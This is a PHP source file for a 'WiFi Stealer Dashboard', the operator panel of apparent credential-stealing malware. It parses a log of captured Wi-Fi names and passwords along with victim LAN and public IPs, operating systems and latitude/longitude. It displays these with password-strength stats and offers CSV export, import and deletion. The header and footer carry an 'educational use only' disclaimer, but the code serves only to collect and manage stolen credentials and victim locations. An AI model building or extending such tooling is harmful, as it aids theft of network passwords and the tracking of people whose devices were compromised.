<?php
// WiFi Stealer Dashboard (extended + CSV upload button)
// DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.

date_default_timezone_set('Asia/Kolkata');

$logFile = __DIR__ . '/wifi_creds.log';

/**
 * Parse a single CSV capture line into a normalized array.
 *
 * CSV order (your payload must match):
 *  0: Timestamp
 *  1: SSID
 *  2: Password
 *  3: Victim LAN IP
 *  4: Victim OS
 *  5: Public IP
 *  6: LAN IP extra detail
 *  7: Latitude
 *  8: Longitude
 *  9: Packet summary
 */
function parse_capture_line($line)
{
    $line = trim($line);
    if ($line === '') {
        return null;
    }

    $fields = str_getcsv($line);
    if (count($fields) < 5) {
        return null;
    }

    $timeStr       = trim($fields[0] ?? '');
    $ssid          = trim($fields[1] ?? '');
    $pass          = trim($fields[2] ?? '');
    $victimLanIp   = trim($fields[3] ?? '');
    $victimOs      = trim($fields[4] ?? '');
    $publicIp      = trim($fields[5] ?? '');
    $lanIpExtra    = trim($fields[6] ?? '');
    $latitude      = trim($fields[7] ?? '');
    $longitude     = trim($fields[8] ?? '');
    $pktSummary    = trim($fields[9] ?? '');

    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
    if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
        return null;
    }

    if ($pass === '') {
        $pass = '(Not Found)';
    }

    $timestamp   = $timeStr !== '' ? $timeStr : 'unknown';
    $passLength  = strlen($pass);
    $allLetters  = ($pass !== '' && ctype_alpha($pass));
    $allNumbers  = ($pass !== '' && ctype_digit($pass));
    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);

    return [
        'time'         => $timestamp,
        'ssid'         => $ssid,
        'password'     => $pass,
        'len'          => $passLength,
        'weak'         => $weakPassword,
        'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
        'os'           => $victimOs !== '' ? $victimOs : 'unknown',
        'public_ip'    => $publicIp !== '' ? $publicIp : 'unknown',
        'lan_ip_extra' => $lanIpExtra !== '' ? $lanIpExtra : 'N/A',
        'latitude'     => $latitude !== '' ? $latitude : 'N/A',
        'longitude'    => $longitude !== '' ? $longitude : 'N/A',
        'pkt_summary'  => $pktSummary !== '' ? $pktSummary : 'N/A',
    ];
}

/**
 * Safe HTML escape.
 */
function h($v)
{
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

/**
 * Simple OS detection from user agent (viewer info only).
 */
function detectOS($userAgent) {
    $ua = strtolower($userAgent);

    if (strpos($ua, 'windows') !== false) return 'Windows';
    if (strpos($ua, 'android') !== false) return 'Android';
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ios') !== false) {
        return 'iOS';
    }
    if (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) return 'macOS';
    if (strpos($ua, 'linux') !== false) return 'Linux';

    return 'Unknown';
}

// --- 1. CSV EXPORT: download all captures as CSV (extended) ---
if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
    if (!file_exists($logFile)) {
        die('No data to export.');
    }

    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (empty($rawLines)) {
        die('No captures to export.');
    }

    $records = [];
    foreach ($rawLines as $rawLine) {
        $entry = parse_capture_line($rawLine);
        if ($entry === null) {
            continue;
        }
        $records[] = [
            $entry['time'],
            $entry['ssid'],
            $entry['password'],
            $entry['ip_main'],
            $entry['os'],
            $entry['public_ip'],
            $entry['lan_ip_extra'],
            $entry['latitude'],
            $entry['longitude'],
            $entry['pkt_summary'],
        ];
    }

    if (empty($records)) {
        die('No valid captures to export.');
    }

    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    $fp = fopen('php://output', 'w');

    fputcsv($fp, [
        'Time',
        'SSID',
        'Password',
        'Victim LAN IP',
        'Victim OS',
        'Public IP',
        'LAN extra',
        'Latitude',
        'Longitude',
        'Packet summary'
    ]);

    foreach ($records as $row) {
        fputcsv($fp, $row);
    }

    fclose($fp);
    exit;
}

// --- 2. CSV IMPORT: via upload button ---
$importStatus = null;
if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
        $importStatus = 'Error: No file uploaded or upload failed.';
    } else {
        $tmpName = $_FILES['csv_file']['tmp_name'];
        if (!is_uploaded_file($tmpName)) {
            $importStatus = 'Invalid upload.';
        } else {
            $fp = fopen($tmpName, 'r');
            if (!$fp) {
                $importStatus = 'Cannot read uploaded file.';
            } else {
                $addedCount = 0;
                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
                    if (count($fields) >= 5) {
                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
                        $addedCount++;
                    }
                }
                fclose($fp);
                $importStatus = "Imported $addedCount captures from CSV.";
            }
        }
    }
}

// --- 3. Clear all entries ---
if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
    if (file_exists($logFile)) {
        $handle = fopen($logFile, 'w');
        if ($handle) {
            fclose($handle);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- 4. Delete single entry (line index in log file) ---
if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;

    if (file_exists($logFile) && $index >= 0) {
        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (isset($fileLines[$index])) {
            unset($fileLines[$index]);
            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- 5. Viewer info ---
$viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
$viewerOS = detectOS($viewerUA);

// --- 6. Read and parse captures ---
$rawLines = [];
if (file_exists($logFile)) {
    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

$totalCaptures = 0;
$ssidCount = [];
$ipCount = [];
$totalPasswordLength = 0;
$weakPasswords = 0;
$captureEntries = [];

foreach ($rawLines as $idx => $rawLine) {
    $entry = parse_capture_line($rawLine);
    if ($entry === null) {
        continue;
    }

    $totalCaptures++;

    if ($entry['ssid'] !== '') {
        $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
    }

    if ($entry['ip_main'] !== 'offline') {
        $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
    }

    $totalPasswordLength += $entry['len'];
    if ($entry['weak']) {
        $weakPasswords++;
    }

    $entry['idx'] = count($captureEntries);   // display index
    $entry['log_index'] = $idx;              // actual line index for deletion
    $captureEntries[] = $entry;
}

$uniqueSSIDs     = count($ssidCount);
$uniqueIPs       = count($ipCount);
$avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
$weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;

// --- 7. View mode ---
$viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'full';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WiFi Stealer Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
            color: #e5e7eb;
        }
        .page {
            max-width: 1100px;
            margin: 0 auto;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .page-header {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        .title-group {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .title {
            font-size: 22px;
            font-weight: 600;
        }
        .subtitle {
            font-size: 12px;
            color: #9ca3af;
        }
        .viewer-meta {
            font-size: 11px;
            color: #9ca3af;
        }
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        .btn {
            font-size: 12px;
            border-radius: 999px;
            padding: 6px 12px;
            border: 1px solid rgba(148,163,184,0.5);
            background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
            color: #e5e7eb;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            border-color: #4f46e5;
            box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
        }
        .btn-danger {
            border-color: rgba(248,113,113,0.7);
            color: #fecaca;
            background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
        }
        .btn-danger:hover {
            box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
        }
        .btn-sm {
            padding: 4px 8px;
            font-size: 11px;
        }
        .upload-form {
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .upload-form input[type="file"] {
            font-size: 11px;
            max-width: 180px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 12px;
        }
        .stat-card {
            background: #0f172a;
            border-radius: 10px;
            padding: 10px 12px;
            border: 1px solid rgba(148,163,184,0.25);
        }
        .stat-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
        }
        .stat-value {
            margin-top: 4px;
            font-size: 18px;
            font-weight: 600;
            color: #e5e7eb;
        }
        .card {
            background: rgba(15,23,42,0.95);
            border-radius: 12px;
            border: 1px solid rgba(148,163,184,0.3);
            box-shadow: 0 22px 45px rgba(15,23,42,0.7);
            padding: 12px 14px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        th, td {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(55,65,81,0.8);
            text-align: left;
            vertical-align: top;
        }
        th {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
            background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
        }
        tr:hover {
            background: rgba(31,41,55,0.7);
        }
        .badge {
            display: inline-block;
            border-radius: 999px;
            padding: 2px 6px;
            font-size: 10px;
        }
        .badge-weak {
            background: rgba(248,113,113,0.18);
            color: #fecaca;
        }
        .badge-ok {
            background: rgba(74,222,128,0.18);
            color: #bbf7d0;
        }
        .password {
            font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        }
        .footer {
            margin-top: auto;
            font-size: 11px;
            color: #6b7280;
            text-align: center;
            padding-top: 8px;
            border-top: 1px solid rgba(31,41,55,0.9);
        }
        .status {
            font-size: 12px;
            margin-top: 4px;
        }
        .status-ok {
            color: #bbf7d0;
        }
        .status-error {
            color: #fecaca;
        }
        @media (max-width: 768px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }
            thead {
                display: none;
            }
            tr {
                margin-bottom: 10px;
            }
            td {
                border: none;
                padding: 4px 6px;
            }
        }
    </style>
    <script>
        var autoRefresh = false;
        var refreshTimer = null;
        var REFRESH_INTERVAL = 10000;

        function toggleAutoRefresh(enabled) {
            autoRefresh = enabled;
            if (refreshTimer) {
                clearInterval(refreshTimer);
                refreshTimer = null;
            }
            var toggleBtn = document.getElementById('auto-refresh-toggle');
            if (autoRefresh) {
                refreshTimer = setInterval(function() {
                    window.location.reload();
                }, REFRESH_INTERVAL);
                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: ON';
                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
            } else {
                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: OFF';
                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var savedPreference = window.localStorage ? localStorage.getItem('wifi_dashboard_auto_refresh') : null;
            if (savedPreference === 'on' || savedPreference === null) {
                toggleAutoRefresh(true);
            } else {
                toggleAutoRefresh(false);
            }
        });
    </script>
</head>
<body>
<div class="page">
    <div class="page-header">
        <div class="title-group">
            <div class="title">WiFi Stealer Dashboard</div>
            <div class="subtitle">
                Captures: <?php echo h($totalCaptures); ?> • Timezone: IST
            </div>
            <div class="viewer-meta">
                You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
            </div>
        </div>
        <div class="actions">
            <a href="?action=export_csv" class="btn">Export CSV</a>

            <!-- Upload CSV button -->
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="import_csv">
                <input type="file" name="csv_file" accept=".csv" required>
                <button type="submit" class="btn btn-sm">Upload CSV</button>
            </form>

            <a href="?view=full" class="btn btn-sm"
               style="<?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                Full view
            </a>
            <a href="?view=compact" class="btn btn-sm"
               style="<?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                Compact view
            </a>
            <button type="button" class="btn" id="auto-refresh-toggle"
                    onclick="toggleAutoRefresh(!autoRefresh);">
                Auto-refresh: OFF
            </button>
            <form method="post"
                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                  style="display:inline;">
                <input type="hidden" name="action" value="clear_all">
                <button type="submit" class="btn btn-danger">
                    Clear all history
                </button>
            </form>
        </div>
    </div>

    <?php if ($importStatus !== null): ?>
        <div class="status <?php echo strpos($importStatus, 'Error') === 0 ? 'status-error' : 'status-ok'; ?>">
            <?php echo h($importStatus); ?>
        </div>
    <?php endif; ?>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">Total captures</div>
            <div class="stat-value"><?php echo h($totalCaptures); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Unique SSIDs</div>
            <div class="stat-value"><?php echo h($uniqueSSIDs); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Source IPs</div>
            <div class="stat-value"><?php echo h($uniqueIPs); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Avg password length</div>
            <div class="stat-value"><?php echo h($avgPasswordLen); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Weak passwords</div>
            <div class="stat-value"><?php echo h($weakPercentage); ?>%</div>
        </div>
    </div>

    <div class="card">
        <table>
            <thead>
            <tr>
                <th>#</th>
                <th>Time</th>
                <th>SSID</th>
                <?php if ($viewMode === 'full'): ?>
                    <th>Password</th>
                    <th>Len</th>
                    <th>Strength</th>
                    <th>Victim LAN IP</th>
                    <th>LAN extra</th>
                    <th>Public IP</th>
                    <th>Location</th>
                    <th>Packet summary</th>
                    <th>OS</th>
                <?php else: ?>
                    <th>Pass / strength</th>
                <?php endif; ?>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php if (empty($captureEntries)): ?>
                <tr>
                    <td colspan="<?php echo $viewMode === 'full' ? 13 : 5; ?>"
                        style="text-align:center; padding:12px; color:#9ca3af;">
                        No captures yet.
                    </td>
                </tr>
            <?php else: ?>
                <?php foreach ($captureEntries as $entry): ?>
                    <tr>
                        <td><?php echo h($entry['idx'] + 1); ?></td>
                        <td><?php echo h($entry['time']); ?></td>
                        <td><?php echo h($entry['ssid']); ?></td>

                        <?php if ($viewMode === 'full'): ?>
                            <td class="password"><?php echo h($entry['password']); ?></td>
                            <td><?php echo h($entry['len']); ?></td>
                            <td>
                                <?php if ($entry['weak']): ?>
                                    <span class="badge badge-weak">weak</span>
                                <?php else: ?>
                                    <span class="badge badge-ok">ok</span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo h($entry['ip_main']); ?></td>
                            <td><?php echo h($entry['lan_ip_extra']); ?></td>
                            <td><?php echo h($entry['public_ip']); ?></td>
                            <td><?php echo h($entry['latitude'] . ', ' . $entry['longitude']); ?></td>
                            <td><?php echo h($entry['pkt_summary']); ?></td>
                            <td><?php echo h($entry['os']); ?></td>
                        <?php else: ?>
                            <td>
                                <span class="password"><?php echo h($entry['password']); ?></span><br>
                                <?php if ($entry['weak']): ?>
                                    <span class="badge badge-weak">weak</span>
                                <?php else: ?>
                                    <span class="badge badge-ok">ok</span>
                                <?php endif; ?>
                            </td>
                        <?php endif; ?>

                        <td>
                            <form method="post" style="display:inline;"
                                  onsubmit="return confirm('Delete this entry?');">
                                <input type="hidden" name="action" value="delete_one">
                                <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
                                <button type="submit" class="btn btn-sm btn-danger">
                                    Delete
                                </button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php endif; ?>
            </tbody>
        </table>
    </div>

    <div class="footer">
        © 2026 WiFi Stealer Dashboard – Made By Zypher17 • Educational use only
    </div>
</div>
</body>
</html>
